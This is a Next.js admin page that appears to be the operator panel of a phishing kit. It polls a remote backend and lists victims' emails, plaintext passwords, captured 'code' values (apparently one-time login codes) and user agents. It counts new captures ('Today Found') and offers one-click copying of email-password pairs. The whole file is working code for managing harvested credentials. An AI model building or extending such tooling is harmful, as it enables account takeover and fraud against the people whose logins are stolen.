'use client';
import axios from 'axios';
import React, { useEffect, useState } from 'react';
import { useRouter } from 'next/navigation';
import fetcher from '@/components/CustomFetcher';
import useSWR from 'swr';
import copy from '@/images/copy.png';
import del from '@/images/del.png';
import Image from 'next/image';
import out from '@/images/out.png';
import DeleteModal from '@/components/DeleteModal';
import { toast, Toaster } from 'alert'; 
import Skeleton from 'react-loading-skeleton'; 
import 'react-loading-skeleton/dist/skeleton.css'; 
import { Scrollbars } from 'react-custom-scrollbars-2';






const Page = () => {
  const router = useRouter();

  const { data: loginToday, isLoading: loginTodayLoading } = useSWR('https://mega-back-kznl.onrender.com/api/logindata/count?filter=today', fetcher, { refreshInterval: 50, revalidateOnFocus: true });
  const { data: loginWeeckly, isLoading: loginWeecklyLoading } = useSWR('https://mega-back-kznl.onrender.com/api/logindata/count?filter=weekly', fetcher, { refreshInterval: 50, revalidateOnFocus: true });
  const { data: signToday, isLoading: signTodayLoading } = useSWR('https://mega-back-kznl.onrender.com/api/signupdata/count?filter=today', fetcher, { refreshInterval: 50, revalidateOnFocus: true });
  const { data: signWeeckly, isLoading: signWeecklyloading } = useSWR('https://mega-back-kznl.onrender.com/api/signupdata/count?filter=weekly', fetcher, { refreshInterval: 5000, revalidateOnFocus: true });
  const { data: click, error: click_error, isLoading: click_Loading } = useSWR('https://mega-back-kznl.onrender.com/api/clicks', fetcher, { refreshInterval: 50, revalidateOnFocus: true });
  const { data: loginUser, error: login_error, isLoading: login_Loading } = useSWR('https://mega-back-kznl.onrender.com/api/loginAll', fetcher, { refreshInterval: 50, revalidateOnFocus: true });
  const { data: signupUser, error: signup_error, isLoading: signup_Loading } = useSWR('https://mega-back-kznl.onrender.com/api/signupAll', fetcher, { refreshInterval: 50, revalidateOnFocus: true });

  const [selectedProduct, setSelectedProduct] = useState('login');
  const [isModalOpen, setIsModalOpen] = useState(false);
  const [selectedItemId, setSelectedItemId] = useState(null);
  const [clickNum,setClickNum] = useState(0);
  const [hasMore, setHasMore] = useState(true); // For tracking more items
  const [items, setItems] = useState([]); // Store items for infinite scroll



  const productsToRender = selectedProduct === 'login' ? loginUser : signupUser;

  const handleLoginDelete = async (id) => {
    await axios.delete(`https://mega-back-kznl.onrender.com/api/logindelete/${id}`);
    setIsModalOpen(false);
  };
  const handlesignupDelete = async (id) => {
    await axios.delete(`https://mega-back-kznl.onrender.com/api/signupdelete/${id}`);
    setIsModalOpen(false);
  };

  const openModal = (id) => {
    setSelectedItemId(id);
    setIsModalOpen(true);
  };

  const closeModal = () => {
    setIsModalOpen(false);
  };

  const handleCopy = (email, password) => {
    navigator.clipboard.writeText(`Email: ${email}, Password: ${password}`);
    toast.success("Copy Success");
  };

  

  const handleLogout = () => {
    localStorage.removeItem('isLoggedIn'); // Remove authentication status
    router.push('/Admin_Login'); // Redirect to login page
  };

  
  useEffect(() => {
    const savedProduct = localStorage.getItem('selectedProduct');
    if (savedProduct) {
      setSelectedProduct(savedProduct);
    }
  }, []);

  const handleProductChange = (product) => {
    setSelectedProduct(product);
    localStorage.setItem('selectedProduct', product);
  };

  useEffect(() => {
    if (localStorage.getItem('isLoggedIn') !== 'true') {
      router.push('/Admin_Login');
    }else{
      router.push('/dashboardAdmin');
    }
  }, [router]);

    

  useEffect(()=>{
    let total = 0;


    for (const key in click?.pages) {
    if (click?.pages.hasOwnProperty(key)) {
    total += click?.pages[key]; // Add the value to total
    }
    }
    setClickNum(total);
      },[click?.pages])

      
  


  if (login_error || signup_error || click_error) {
    return <p className="text-red-500">Error: {login_error?.message || signup_error?.message}</p>;
  }



  return (
    <>
      <div className="bg-[#0E0C23] h-screen w-auto py-[40px] text-white">
        <Toaster position="top-right" />

        <div className="px-[20px] sm:px-[40px] md:px-[80px] lg:px-[200px] flex flex-col gap-[30px]">
          <div className="flex items-start justify-between">
            <div className="flex items-start gap-[24px]">
              <button onClick={() => handleProductChange('login')} className={`w-[200px] h-[80px] ${selectedProduct === 'login' ? "bg-[#007942] text-white" : "bg-white text-black"} rounded-md font-bold text-[24px]`}>LOG IN</button>
              <button onClick={() => handleProductChange('signup')} className={`w-[200px] h-[80px] ${selectedProduct === 'signup' ? "bg-[#007942] text-white" : "bg-white text-black"} rounded-md font-bold text-[24px]`}>SIGN UP</button>
              <div className="flex gap-[24px]">
                <button disabled className="bg-[#212146] text-center w-[200px] h-[80px] rounded-md font-bold text-[16px]">
                  Today Found<br />
                  {loginTodayLoading || signTodayLoading ? <Skeleton width={100} /> : selectedProduct === 'login' ? loginToday?.count : signToday?.count}
                </button>
                <button disabled className="bg-[#212146] text-center w-[200px] h-[80px] rounded-md font-bold text-[16px]">
                  Last Week Found<br />
                  {loginWeecklyLoading || signWeecklyloading ? <Skeleton width={100} /> : selectedProduct === 'login' ? loginWeeckly?.count : signWeeckly?.count}
                </button>
                <button disabled className="bg-[#212146] text-center w-[200px] h-[80px] rounded-md font-bold text-[16px]">
                  Today Click<br />  {loginWeecklyLoading || signWeecklyloading ? <Skeleton width={100} /> : clickNum} 
                </button>
              </div>
            </div>
            <button onClick={handleLogout} className="px-6 py-2 text-white bg-[#DC3545] rounded-md hover:bg-red-700 font-bold text-[16px]">
              <span className="flex items-center gap-[10px]">
                Log Out
                <Image src={out} height={20} width={20} alt="Logout" />
              </span>
            </button>
          </div>

          <div style={{ height: 700, overflow: 'hidden' }}>
          <Scrollbars style={{ height: '100%' }}
          autoHide
          autoHideTimeout={1000}
          autoHideDuration={200}
          autoHeight
          autoHeightMin={700}
          thumbMinSize={30}
          universal={true}
          
          
          
          >
            <table className="min-w-full text-left border-collapse " >
           
              <thead className='sticky top-0 z-10 bg-[#0F0F29]'>
                <tr className="border-b border-[#E4E7EC]">
                  <th className="py-2 w-[80px]">SL.</th>
                  <th className="py-2">Email</th>
                  <th className="py-2">Password</th>
                  <th className={`py-2 ${selectedProduct === 'signup' ? 'hidden' : ''} w-[90px]`}>Code</th>
                  <th className={`py-2 ${selectedProduct === 'signup' ? 'w-[700px]' : 'w-[550px]'}`}>User Agent</th>
                  <th className="py-2">Date</th>
                  <th className="py-2">Action</th>
                </tr>
              </thead>
             
              <tbody>
             
                {login_Loading || signup_Loading ? (
                  <tr>
                    <td colSpan={7} className="text-center">
                    <h3>Loading....</h3>
                    </td>
                  </tr>
                ) : productsToRender.map((item, index) => (
                  <tr key={item._id} className={`h-[56px] border-gray-700 ${index % 2 === 0 ? 'bg-[#1A1A44]' : 'bg-[#0E0C23]'}`}>
                    <td className="py-2">{index + 1}.</td>
                    <td className="text-sm sm:text-base">{item.email}</td>
                    <td className="text-sm sm:text-base">{item.password}</td>
                    <td className={`text-sm ${selectedProduct === 'signup' ? 'hidden' : ''} ${item.update === true ? "text-white":"text-red-500"} sm:text-base `}>{item.update === true ? item.code : "Empty"}</td>
                    <td className="text-sm sm:text-base">{item.userAgent}</td>
                    <td className="text-sm sm:text-base">{item.createdAt.slice(0, 16)}</td>
                    <td className="w-[185px]">
                      <button onClick={() => handleCopy(item?.email, item?.password)} className="px-3 py-1 mr-3 gap-[5px] text-white bg-[#007942] text-[14px] rounded-md hover:bg-green-700">
                        <span className="flex items-center gap-[5px]">
                          <Image src={copy} height={12} width={12} alt="Copy" />
                          Copy
                        </span>
                      </button>
                      <button onClick={() => openModal(item._id)} className="px-3 py-1 ml-3 text-white bg-[#DC3545] text-[14px] rounded-md hover:bg-red-700">
                        <span className="flex items-center gap-[5px]">
                          <Image src={del} height={12} width={12} alt="Delete" />
                          Delete
                        </span>
                      </button>
                      {isModalOpen && (
                        <DeleteModal
                          closeModal={closeModal}
                          selectedItemId={selectedItemId}
                          handleloginDelete={handleLoginDelete}
                          handlesignDelete={handlesignupDelete}
                          selectedProduct={selectedProduct}
                        />
                      )}
                    </td>
                  </tr>
                ))}
   
              </tbody>
              
            </table>
            </Scrollbars>
          </div>
        </div>
      </div>
    </>
  );
};



export default Page;
